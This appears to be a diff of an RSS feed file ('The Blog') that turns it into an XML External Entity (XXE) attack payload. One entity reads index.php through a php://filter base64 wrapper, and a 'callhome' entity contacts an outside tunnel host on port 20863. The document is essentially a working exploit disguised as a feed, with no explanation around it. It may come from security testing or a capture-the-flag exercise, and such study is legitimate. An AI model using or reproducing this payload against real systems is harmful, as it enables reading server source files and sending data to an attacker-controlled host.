@@ -1,5 +1,9 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://jancuk223344-20863.portmap.host:20863"> ]>
+<?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >
+  <!ENTITY callhome SYSTEM "http://jancuk223344-20863.portmap.host:20863/?hello=1&there=2">
+]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
     <title>The Blog</title>
